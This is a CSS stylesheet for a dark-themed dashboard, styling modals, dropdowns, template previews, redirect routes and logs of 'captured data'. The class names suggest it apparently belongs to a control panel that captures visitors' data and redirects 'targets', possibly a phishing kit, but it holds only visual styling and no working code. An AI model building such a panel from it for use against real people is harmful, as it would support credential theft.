	.redirectTarg .closeBtn {
		opacity: 0.7;
		transition: all 0.3s ease;
	}

	.redirectTarg .closeBtn:hover {
		opacity: 1;
		transform: scale(1.1);
	}

	.redirectTarg p {
		margin: 0;
		padding: 0;
		border: none;
	}

	.redirectTarg > p {
		margin-bottom: 1em;
	}

	.redirectTarg .sendPage {
		display: flex;
		flex-direction: column;
		gap: 1em;
	}

	.styledDropdown {
		font-family: 'DM Sans';
		padding: 0.8em 1em;
		border: 1px solid rgba(98, 71, 218, 0.3);
		background: rgba(22, 23, 26, 0.7);
		color: white;
		border-radius: 0.8em;
		transition: all 0.3s ease;
		cursor: pointer;
		outline: none;
	}

	.styledDropdown:hover,
	.styledDropdown:focus {
		border-color: rgba(98, 71, 218, 0.6);
		background: rgba(22, 23, 26, 0.9);
	}

	.styledDropdown optgroup {
		background: #0e0d15;
		color: rgba(255, 255, 255, 0.7);
		font-weight: 500;
	}

	.styledDropdown option {
		background: #16171a;
		color: white;
		padding: 0.8em;
	}

	.redirectTarg .sendPage button {
		margin-top: 0.5em;
		padding: 0.8em;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		border: none;
		font-weight: 500;
		letter-spacing: 0.02em;
		transition: all 0.3s ease;
	}

	.redirectTarg .sendPage button:hover {
		transform: translateY(-2px);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.4);
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.9) 0%, rgba(56, 35, 155, 0.9) 100%);
	}

	.closeBtn:hover {
		cursor: pointer;
	}

	.modal-overlay {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background: rgba(0, 0, 0, 0.8);
		backdrop-filter: blur(8px);
		display: flex;
		justify-content: center;
		align-items: center;
		z-index: 1000;
	}

	.captured-data-modal {
		width: 600px;
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.1) 0%, rgba(14, 13, 21, 0.95) 100%);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
		overflow: hidden;
	}

	.modal-header {
		padding: 1.5em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
		display: flex;
		justify-content: space-between;
		align-items: center;
	}

	.header-content h2 {
		margin: 0;
		font-size: 1.5em;
		background: linear-gradient(45deg, #fff, rgba(98, 71, 218, 1));
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
	}

	.subtitle {
		margin: 0.5em 0 0 0;
		font-size: 0.9em;
		color: #8b8b8b;
	}

	.close-button {
		background: none;
		border: none;
		color: #8b8b8b;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.close-button:hover {
		color: white;
		transform: rotate(90deg);
	}

	.logs-container {
		padding: 1.5em;
		max-height: 60vh;
		overflow-y: auto;
	}

	.log-entry {
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		padding: 1.2em;
		margin-bottom: 1em;
		transition: all 0.3s ease;
	}

	.log-entry:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.6);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.2);
	}

	.log-header {
		display: flex;
		justify-content: space-between;
		align-items: center;
		margin-bottom: 1em;
		padding-bottom: 0.8em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	.page-indicator,
	.timestamp {
		display: flex;
		align-items: center;
		gap: 0.5em;
		color: #8b8b8b;
		font-size: 0.9em;
	}

	.page-name {
		color: rgba(98, 71, 218, 1);
		font-weight: 500;
	}

	.log-content {
		padding: 0.5em;
	}

	.data-label {
		color: #8b8b8b;
		margin: 0 0 0.5em 0;
		font-size: 0.9em;
	}

	.data-content {
		background: rgba(14, 13, 21, 0.6);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.5em;
		padding: 1em;
	}

	.captured-text {
		color: white;
		font-family: monospace;
		font-size: 0.95em;
	}

	.hidden-data {
		display: flex;
		align-items: center;
		gap: 0.5em;
		color: #8b8b8b;
		font-style: italic;
	}

	.modal-pagination {
		display: flex;
		justify-content: center;
		align-items: center;
		gap: 0.5em;
		padding: 1.5em;
		border-top: 1px solid rgba(98, 71, 218, 0.2);
	}

	.modal-pagination .page-btn {
		display: flex;
		align-items: center;
		justify-content: center;
		width: 2.5em;
		height: 2.5em;
		border: 1px solid rgba(98, 71, 218, 0.2);
		background: rgba(56, 35, 155, 0.1);
		color: white;
		border-radius: 0.5em;
		cursor: pointer;
		transition: all 0.2s ease;
	}

	.modal-pagination .page-btn:hover:not(:disabled) {
		background: rgba(98, 71, 218, 0.3);
		transform: translateY(-2px);
	}

	.modal-pagination .page-btn.active {
		background: rgba(98, 71, 218, 0.4);
		border-color: rgba(98, 71, 218, 0.6);
	}

	.modal-pagination .page-btn:disabled {
		opacity: 0.5;
		cursor: not-allowed;
	}

	.actions-modal {
		width: 950px;
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.1) 0%, rgba(14, 13, 21, 0.95) 100%);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
		overflow: hidden;
	}

	.modal-content {
		padding: 1.5em;
	}

	.template-selection {
		margin-bottom: 2em;
	}

	.section-label {
		display: flex;
		align-items: center;
		gap: 0.5em;
		color: #8b8b8b;
		margin-bottom: 1em;
		font-size: 0.9em;
	}

	.styled-select {
		width: 100%;
		padding: 1em;
		background: rgba(14, 13, 21, 0.6);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		color: white;
		font-family: 'DM Sans', sans-serif;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.styled-select:hover {
		border-color: rgba(98, 71, 218, 0.6);
		box-shadow: 0 0 15px rgba(98, 71, 218, 0.2);
	}

	.styled-select optgroup {
		background: #0e0d15;
		color: #8b8b8b;
		font-weight: 500;
		padding: 0.5em;
	}

	.styled-select option {
		background: #16171a;
		color: white;
		padding: 0.8em;
	}

	.info-panel {
		display: flex;
		flex-direction: column;
		gap: 1.5em;
		margin-bottom: 2em;
	}

	.info-section {
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		padding: 1.2em;
		transition: all 0.3s ease;
	}

	.info-section:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.4);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.2);
	}

	.info-header {
		display: flex;
		align-items: center;
		gap: 0.5em;
		margin-bottom: 0.8em;
		color: rgba(98, 71, 218, 1);
	}

	.info-header h3 {
		margin: 0;
		font-size: 1em;
		font-weight: 500;
	}

	.description,
	.data-info {
		color: #8b8b8b;
		font-size: 0.9em;
		line-height: 1.6;
		margin: 0;
	}

	.highlight {
		color: rgba(98, 71, 218, 1);
		font-weight: 500;
		font-family: monospace;
	}

	.submit-button {
		width: 100%;
		padding: 1em;
		display: flex;
		align-items: center;
		justify-content: center;
		gap: 0.5em;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		border: none;
		border-radius: 0.8em;
		color: white;
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.submit-button:hover {
		transform: translateY(-2px);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.4);
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.9) 0%, rgba(56, 35, 155, 0.9) 100%);
	}

	.submit-button .material-icons {
		font-size: 1.2em;
	}

	.content-grid {
		display: grid;
		grid-template-columns: 1fr 400px;
		gap: 2em;
		margin-bottom: 2em;
	}

	.left-panel {
		display: flex;
		flex-direction: column;
		gap: 1.5em;
	}

	.preview-panel {
		background: rgba(14, 13, 21, 0.8);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1em;
		padding: 1.5em;
		display: flex;
		flex-direction: column;
		gap: 1em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
	}

	.preview-header {
		display: flex;
		align-items: center;
		gap: 0.8em;
		padding-bottom: 1em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	.preview-header h3 {
		margin: 0;
		font-size: 1.1em;
		font-weight: 500;
		background: linear-gradient(45deg, #fff, rgba(98, 71, 218, 1));
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
	}

	.preview-container {
		position: relative;
		width: 100%;
		padding-top: 120%;
		background: rgba(14, 13, 21, 0.9);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		overflow: hidden;
	}

	.preview-frame {
		position: absolute;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		display: flex;
		align-items: center;
		justify-content: center;
		padding: 1em;
	}

	.preview-frame img {
		width: 100%;
		height: 100%;
		object-fit: contain;
		border-radius: 0.5em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
		transition: all 0.3s ease;
	}

	.preview-frame:hover img {
		transform: scale(1.02);
		box-shadow: 0 12px 40px rgba(98, 71, 218, 0.3);
	}

	.preview-overlay {
		position: absolute;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		background: rgba(14, 13, 21, 0.4);
		display: flex;
		align-items: center;
		justify-content: center;
		opacity: 0;
		transition: opacity 0.3s ease;
		border-radius: 0.8em;
	}

	.preview-frame:hover .preview-overlay {
		opacity: 1;
	}

	.preview-image {
		cursor: zoom-in;
	}

	.fullscreen-preview {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background: rgba(14, 13, 21, 0.95);
		backdrop-filter: blur(10px);
		z-index: 1100;
		display: flex;
		align-items: center;
		justify-content: center;
		padding: 2em;
		cursor: zoom-out;
	}

	.fullscreen-container {
		position: relative;
		max-width: 90%;
		max-height: 90vh;
	}

	.close-fullscreen {
		position: absolute;
		top: -3em;
		right: 0;
		background: none;
		border: none;
		color: white;
		cursor: pointer;
		padding: 0.5em;
		z-index: 1101;
		transition: all 0.3s ease;
		border-radius: 50%;
		display: flex;
		align-items: center;
		justify-content: center;
	}

	.close-fullscreen:hover {
		background: rgba(98, 71, 218, 0.2);
		transform: rotate(90deg);
	}

	.fullscreen-container img {
		max-width: 100%;
		max-height: 85vh;
		object-fit: contain;
		border-radius: 0.8em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
	}

	.button-group {
		display: flex;
		gap: 1em;
		margin-bottom: 1em;
	}

	.custom-url-btn {
		display: flex;
		align-items: center;
		gap: 0.5em;
		padding: 1em;
		background: rgba(56, 35, 155, 0.2);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		color: white;
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.custom-url-btn:hover {
		background: rgba(56, 35, 155, 0.3);
		transform: translateY(-2px);
	}

	.custom-url-input {
		margin-top: 1em;
		padding: 1em;
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
	}

	.styled-input {
		width: 100%;
		padding: 0.8em;
		background: rgba(14, 13, 21, 0.6);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.5em;
		color: white;
		font-family: 'DM Sans', sans-serif;
		margin-bottom: 0.5em;
		transition: all 0.3s ease;
	}

	.styled-input:focus {
		outline: none;
		border-color: rgba(98, 71, 218, 0.6);
		box-shadow: 0 0 15px rgba(98, 71, 218, 0.2);
	}

	.custom-redirect-btn {
		width: 100%;
		padding: 0.8em;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		border: none;
		border-radius: 0.5em;
		color: white;
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.custom-redirect-btn:hover {
		transform: translateY(-2px);
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.9) 0%, rgba(56, 35, 155, 0.9) 100%);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.4);
	}

	.custom-select {
		position: relative;
		width: 100%;
	}

	.selected-option {
		display: flex;
		align-items: center;
		gap: 0.8em;
		padding: 1em;
		background: rgba(14, 13, 21, 0.8);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.selected-option:hover {
		border-color: rgba(98, 71, 218, 0.6);
		background: rgba(14, 13, 21, 0.9);
	}

	.dropdown-arrow {
		margin-left: auto;
		transition: transform 0.3s ease;
	}

	.dropdown-arrow.open {
		transform: rotate(180deg);
	}

	.options-container {
		position: absolute;
		top: calc(100% + 0.5em);
		left: 0;
		right: 0;
		max-height: 400px;
		overflow-y: auto;
		background: rgba(14, 13, 21, 0.95);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
		z-index: 100;
	}

	.option-group {
		padding: 0.5em;
	}

	.group-header {
		padding: 0.8em 1em;
		color: rgba(98, 71, 218, 1);
		font-size: 0.9em;
		font-weight: 500;
		text-transform: uppercase;
		letter-spacing: 0.05em;
	}

	.option {
		display: flex;
		align-items: center;
		gap: 0.8em;
		padding: 0.8em 1em;
		cursor: pointer;
		border-radius: 0.5em;
		transition: all 0.2s ease;
	}

	.option:hover {
		background: rgba(98, 71, 218, 0.1);
	}

	.option.selected {
		background: rgba(98, 71, 218, 0.2);
	}

	.option-text {
		flex: 1;
		font-size: 0.95em;
	}

	.check {
		color: rgba(98, 71, 218, 1);
	}

	.preview-overlay {
		position: absolute;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		background: rgba(14, 13, 21, 0.4);
		display: flex;
		align-items: center;
		justify-content: center;
		opacity: 0;
		transition: opacity 0.3s ease;
		border-radius: 0.8em;
	}

	.preview-frame:hover .preview-overlay {
		opacity: 1;
	}

	.action-panel {
		display: flex;
		gap: 1em;
		margin-top: 2em;
	}

	.action-btn {
		flex: 1;
		display: flex;
		align-items: center;
		justify-content: center;
		gap: 0.8em;
		padding: 1.2em;
		border-radius: 0.8em;
		font-weight: 500;
		transition: all 0.3s ease;
	}

	.url-input-container {
		position: relative;
		margin-bottom: 1em;
	}

	.input-icon {
		position: absolute;
		left: 1em;
		top: 50%;
		transform: translateY(-50%);
		color: rgba(98, 71, 218, 0.6);
	}

	.styled-input {
		padding-left: 3em;
	}

	.group-icon {
		margin-right: 0.5em;
	}

	.action-type-selector {
		display: flex;
		gap: 1em;
		margin-bottom: 2em;
	}

	.type-option {
		flex: 1;
		display: flex;
		align-items: center;
		gap: 1em;
		padding: 1.2em;
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 1em;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.type-option:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.4);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.2);
	}

	.type-option.active {
		background: rgba(56, 35, 155, 0.2);
		border-color: rgba(98, 71, 218, 0.6);
	}

	.type-icon {
		width: 48px;
		height: 48px;
		display: flex;
		align-items: center;
		justify-content: center;
		background: rgba(98, 71, 218, 0.1);
		border-radius: 0.8em;
		transition: all 0.3s ease;
	}

	.type-option.active .type-icon {
		background: rgba(98, 71, 218, 0.3);
	}

	.type-icon .material-icons {
		font-size: 1.5em;
		color: rgba(98, 71, 218, 1);
	}

	.type-content {
		flex: 1;
	}

	.type-content h3 {
		margin: 0;
		font-size: 1.1em;
		font-weight: 500;
		color: white;
	}

	.type-content p {
		margin: 0.3em 0 0 0;
		font-size: 0.9em;
		color: #8b8b8b;
	}

	.type-indicator {
		width: 24px;
		height: 24px;
		display: flex;
		align-items: center;
		justify-content: center;
	}

	.radio-circle {
		width: 18px;
		height: 18px;
		border: 2px solid rgba(98, 71, 218, 0.4);
		border-radius: 50%;
		position: relative;
		transition: all 0.3s ease;
	}

	.radio-circle::after {
		content: '';
		position: absolute;
		top: 50%;
		left: 50%;
		transform: translate(-50%, -50%) scale(0);
		width: 10px;
		height: 10px;
		background: rgba(98, 71, 218, 1);
		border-radius: 50%;
		transition: all 0.3s ease;
	}

	.type-option.active .radio-circle {
		border-color: rgba(98, 71, 218, 1);
	}

	.type-option.active .radio-circle::after {
		transform: translate(-50%, -50%) scale(1);
	}

	.routes-section {
		background: rgba(14, 13, 21, 0.8);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1em;
		padding: 1.5em;
		margin-bottom: 2em;
	}

	.routes-header {
		display: flex;
		align-items: center;
		gap: 0.8em;
		margin-bottom: 1.5em;
		padding-bottom: 1em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	.routes-header h3 {
		margin: 0;
		font-size: 1.1em;
		font-weight: 500;
		background: linear-gradient(45deg, #fff, rgba(98, 71, 218, 1));
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
	}

	.routes-grid {
		display: grid;
		grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
		gap: 1em;
		max-height: 400px;
		overflow-y: auto;
		padding-right: 0.5em;
	}

	.route-card {
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		overflow: hidden;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.route-card:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.4);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.2);
	}

	.route-card.selected {
		background: rgba(56, 35, 155, 0.2);
		border-color: rgba(98, 71, 218, 0.6);
	}

	.route-header {
		display: flex;
		justify-content: space-between;
		align-items: center;
		padding: 1em;
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2), rgba(14, 13, 21, 0.95));
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	.route-info {
		display: flex;
		align-items: center;
		gap: 0.8em;
	}

	.route-info h4 {
		margin: 0;
		color: white;
		font-weight: 500;
	}

	.selection-indicator {
		color: rgba(98, 71, 218, 1);
	}

	.route-steps {
		padding: 1em;
		display: flex;
		flex-direction: column;
		gap: 0.8em;
	}

	.route-step {
		display: flex;
		justify-content: space-between;
		align-items: center;
		padding: 0.8em;
		background: rgba(14, 13, 21, 0.4);
		border: 1px solid rgba(98, 71, 218, 0.1);
		border-radius: 0.5em;
	}

	.step-info {
		display: flex;
		align-items: center;
		gap: 0.8em;
	}

	.step-number {
		width: 24px;
		height: 24px;
		display: flex;
		align-items: center;
		justify-content: center;
		background: rgba(98, 71, 218, 0.2);
		border-radius: 50%;
		font-size: 0.9em;
		color: white;
	}

	.step-name {
		color: white;
		font-size: 0.9em;
	}

	.step-delay {
		display: flex;
		align-items: center;
		gap: 0.4em;
		color: #8b8b8b;
		font-size: 0.9em;
	}

	.dashboard-header {
		margin-bottom: 2em;
		padding: 1.5em;
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.1) 0%, rgba(14, 13, 21, 0.95) 100%);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 1em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
	}

	.header-content {
		display: flex;
		justify-content: space-between;
		align-items: center;
	}

	.title-section h1 {
		margin: 0;
		font-size: 2em;
		background: linear-gradient(45deg, #fff, rgba(98, 71, 218, 1));
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
	}

	.title-section .subtitle {
		margin: 0.5em 0 0 0;
		color: #8b8b8b;
		font-size: 0.95em;
	}

	.header-actions {
		display: flex;
		gap: 1em;
	}

	.danger-action {
		display: flex;
		align-items: center;
		gap: 0.5em;
		padding: 0.8em 1.2em;
		background: rgba(255, 59, 48, 0.1);
		border: 1px solid rgba(255, 59, 48, 0.3);
		border-radius: 0.8em;
		color: rgba(255, 59, 48, 1);
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.danger-action:hover {
		background: rgba(255, 59, 48, 0.2);
		border-color: rgba(255, 59, 48, 0.5);
		transform: translateY(-2px);
		box-shadow: 0 4px 20px rgba(255, 59, 48, 0.2);
	}

	.danger-action .material-icons {
		font-size: 1.2em;
	}

	.actions-cell {
		padding: 0.8em !important;
	}

	.action-buttons {
		display: flex;
		gap: 0.5em;
		justify-content: flex-start;
		align-items: center;
	}

	.action-btn {
		display: flex;
		align-items: center;
		justify-content: center;
		width: 32px;
		height: 32px;
		border-radius: 8px;
		border: 1px solid rgba(98, 71, 218, 0.2);
		background: rgba(56, 35, 155, 0.1);
		color: white;
		cursor: pointer;
		transition: all 0.2s ease;
		padding: 0;
	}

	.action-btn:hover {
		transform: translateY(-2px);
	}

	.action-btn .material-icons {
		font-size: 1.2em;
	}

	.action-btn.redirect {
		color: #6247da;
	}

	.action-btn.redirect:hover {
		background: rgba(98, 71, 218, 0.2);
		border-color: rgba(98, 71, 218, 0.4);
		box-shadow: 0 4px 12px rgba(98, 71, 218, 0.2);
	}

	.action-btn.data {
		color: #00c8ff;
	}

	.action-btn.data:hover {
		background: rgba(0, 200, 255, 0.1);
		border-color: rgba(0, 200, 255, 0.4);
		box-shadow: 0 4px 12px rgba(0, 200, 255, 0.2);
	}

	.action-btn.delete {
		color: #ff3b30;
	}

	.action-btn.delete:hover {
		background: rgba(255, 59, 48, 0.1);
		border-color: rgba(255, 59, 48, 0.4);
		box-shadow: 0 4px 12px rgba(255, 59, 48, 0.2);
	}

	.modal-overlay {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background: rgba(0, 0, 0, 0.8);
		backdrop-filter: blur(8px);
		display: flex;
		justify-content: center;
		align-items: center;
		z-index: 1000;
	}

	.confirmation-modal {
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.1) 0%, rgba(14, 13, 21, 0.95) 100%);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1em;
		padding: 2em;
		max-width: 400px;
		width: 90%;
		text-align: center;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
	}

	.confirmation-content {
		display: flex;
		flex-direction: column;
		align-items: center;
		gap: 1em;
	}

	.warning-icon {
		font-size: 3em;
		color: #ff3b30;
		animation: pulse 2s infinite;
	}

	.confirmation-content h2 {
		margin: 0;
		color: white;
		font-size: 1.5em;
	}

	.confirmation-content p {
		margin: 0;
		color: #8b8b8b;
		line-height: 1.5;
	}

	.target-info {
		display: flex;
		align-items: center;
		gap: 0.5em;
		padding: 0.8em 1.2em;
		background: rgba(255, 59, 48, 0.1);
		border: 1px solid rgba(255, 59, 48, 0.2);
		border-radius: 0.8em;
		margin-top: 0.5em;
	}

	.target-info .material-icons {
		color: rgba(255, 59, 48, 0.8);
		font-size: 1.2em;
	}

	.target-info code {
		color: rgba(255, 59, 48, 1);
		font-family: monospace;
		font-size: 0.95em;
	}

	.confirmation-actions {
		display: flex;
		gap: 1em;
		margin-top: 1.5em;
	}

	.confirmation-actions button {
		display: flex;
		align-items: center;
		gap: 0.5em;
		padding: 0.8em 1.5em;
		border-radius: 0.8em;
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.cancel-btn {
		background: rgba(255, 255, 255, 0.1);
		border: 1px solid rgba(255, 255, 255, 0.2);
		color: white;
	}

	.cancel-btn:hover {
		background: rgba(255, 255, 255, 0.15);
		transform: translateY(-2px);
	}

	.confirm-btn {
		background: rgba(255, 59, 48, 0.1);
		border: 1px solid rgba(255, 59, 48, 0.3);
		color: rgba(255, 59, 48, 1);
	}

	.confirm-btn:hover {
		background: rgba(255, 59, 48, 0.2);
		border-color: rgba(255, 59, 48, 0.5);
		transform: translateY(-2px);
		box-shadow: 0 4px 20px rgba(255, 59, 48, 0.2);
	}

	@keyframes pulse {
		0% {
			transform: scale(1);
			opacity: 1;
		}
		50% {
			transform: scale(1.1);
			opacity: 0.7;
		}
		100% {
			transform: scale(1);
			opacity: 1;
		}
	}

	.search-container {
		padding: 1em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
		position: sticky;
		top: 0;
		background: rgba(14, 13, 21, 0.95);
		backdrop-filter: blur(8px);
		z-index: 1;
		display: flex;
		align-items: center;
		gap: 0.8em;
	}

	.search-icon {
		color: rgba(98, 71, 218, 0.6);
	}

	.search-input {
		flex: 1;
		background: none;
		border: none;
		color: white;
		font-family: 'DM Sans', sans-serif;
		font-size: 0.95em;
		outline: none;
	}

	.search-input::placeholder {
		color: rgba(255, 255, 255, 0.4);
	}

	.no-results {
		padding: 2em;
		text-align: center;
		color: #8b8b8b;
		display: flex;
		flex-direction: column;
		align-items: center;
		gap: 0.8em;
	}

	.no-results .material-icons {
		font-size: 2em;
		color: rgba(98, 71, 218, 0.4);
	}

	.no-results p {
		margin: 0;
		font-size: 0.95em;
	}
</style>
